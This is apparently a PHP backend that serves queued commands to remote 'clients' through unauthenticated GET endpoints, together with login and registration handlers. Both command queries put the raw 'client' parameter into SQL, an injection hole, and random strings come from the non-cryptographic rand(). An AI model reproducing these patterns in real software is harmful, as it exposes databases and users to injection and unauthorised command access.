<?php
require 'DB.php';
require 'Account.php';

DB::connect();
DB::migrate();

if (isset($_GET['ping'])) { die("alive"); }

if (isset($_GET['command']) && isset($_GET['client'])) {

	if ($_GET['command'] == "get_order") {
		$sql = <<<_SQL_
			SELECT *
			FROM tbl_commands
			WHERE client = {$_GET['client']}
			AND del = 0
_SQL_;
		DB::query($sql);
		$result = DB::assoc_all();
		if ($result) {
			foreach($result as $r) {
				echo "order:" . $r['id'] . ":" . $r['command'];
			}
		} else {
			echo "0";
		}
	}

	// close an command order
	else if ($_GET['command'] == "close_order") {
		$sql = <<<_SQL_
			UPDATE tbl_commands
			SET del = 1
			WHERE client = {$_GET['client']}
_SQL_;
		$update = DB::query($sql);
		if ($update) { echo 'OK'; } else { echo 'Failed to close command. Expect a re-atempt...'; }
	}
	die();
}

$user = NULL;

function page_setup ($needs_login=true) {
	global $user;
	if (session_status() == PHP_SESSION_NONE) {
  	session_start();
	}

	if (Account::validate_token()) {
		$user = Account::gather_info();
	}

	if ($needs_login && !isset($user)) {
		die('You are not authorised to view this page. Attempt reported.');
		# TODO: access attempts
	}
}

function randString ($len) {
    $alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
    $pass = array();
    $alphaLength = strlen($alphabet) - 1;
    for ($i = 0; $i < $len; $i++) {
        $n = rand(0, $alphaLength);
        $pass[] = $alphabet[$n];
    }
    return implode($pass);
}

// login
if (isset($_GET['login'])) {
  $login = Account::login(
    $_POST['username'],
    $_POST['password']
  );
}

// logout
if (isset($_GET['logout'])) {
	setcookie("token", '', 1, "/");
	unset($_SESSION['user']);
	header('location:../index.php');
}

// register
if(isset($_GET['register'])) {
  if ( ($_POST['email'] == $_POST['con-email']) &&
       ($_POST['password'] == $_POST['con-password']) ) {
    if (strlen($_POST['password']) > 5) {
      return Account::register(
        $_POST['email'],
        $_POST['password'],
        explode(" ", $_POST['fullname'])
      );
    } else {
      echo "Password must be 6 characters or more in length!";
    }
  } else {
    echo "Password or emails did not match!";
  }
}

?>
